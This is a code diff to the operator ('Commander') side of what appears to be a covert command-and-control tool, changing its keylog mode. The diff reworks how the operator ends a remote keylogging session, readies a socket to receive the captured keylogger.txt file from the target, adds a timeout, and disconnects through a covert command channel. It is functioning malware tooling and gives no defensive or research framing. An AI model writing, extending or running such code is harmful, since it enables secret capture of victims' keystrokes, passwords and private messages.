@@ -320,24 +320,20 @@ class Commander:
                 print(f"[!] Error: {e}")
 
     def _keylog_mode(self):
-        # Open receive socket before entering the loop
-        self._watch_stop.clear()
-        self._watch_thread = threading.Thread(
-            target=self._watch_listener_loop,
-            daemon=True
-        )
-        self._watch_thread.start()
-
         print("\n" + "=" * 60)
-        print("  WATCH MODE ACTIVE — commander is locked")
+        print("  KEYLOG MODE ACTIVE — commander is locked")
         print("  Type 'stopkeylog' to stop.")
         print("=" * 60)
 
         while True:
             try:
-                user_input = input("watching> ").strip().lower()
+                user_input = input("keylog> ").strip().lower()
                 if user_input == 'stopkeylog':
-                    # Tell client to stop its watcher
+                    # Prepare receive socket BEFORE sending KEYLOG_END
+                    # so the keylog file response isn't missed
+                    self.protocol.prepare_recv_socket()
+                    time.sleep(0.1)
+
                     self.protocol.send_packet(
                         self.source_ip,
                         self.target_host,
@@ -345,23 +341,26 @@ class Commander:
                         CommandType.KEYLOG_END,
                         b''
                     )
-                    self._stop_watch_listener()
 
                     print("[*] Waiting for keylog file...")
-                    response = self.receive_response()
+                    response = self.receive_response(timeout=10)  # keylog may be large
                     if response:
                         self.display_response(response, context={"filename": "keylogger.txt"})
+                    else:
+                        print("[!] No keylog file received (timeout)")
 
                     print("[*] Keylog stopped. Resuming normal command mode.")
                     print("=" * 60)
                     break
+
                 elif user_input == '':
                     continue
+
                 else:
                     print("[!] Keylog mode is active — only 'stopkeylog' is accepted.")
 
             except KeyboardInterrupt:
-                print("\n[*] Interrupted — stopping watch and disconnecting...")
+                print("\n[*] Interrupted — stopping keylog and disconnecting...")
                 self.protocol.send_packet(
                     self.source_ip,
                     self.target_host,
@@ -369,12 +368,11 @@ class Commander:
                     CommandType.KEYLOG_END,
                     b''
                 )
-                self._stop_watch_listener()
                 try:
                     self.send_covert_command(CommandType.DISCONNECT)
                 except Exception:
                     pass
-                raise  # re-raise so outer loop exits too'
+                raise
 
     def _watch_mode(self):
         """
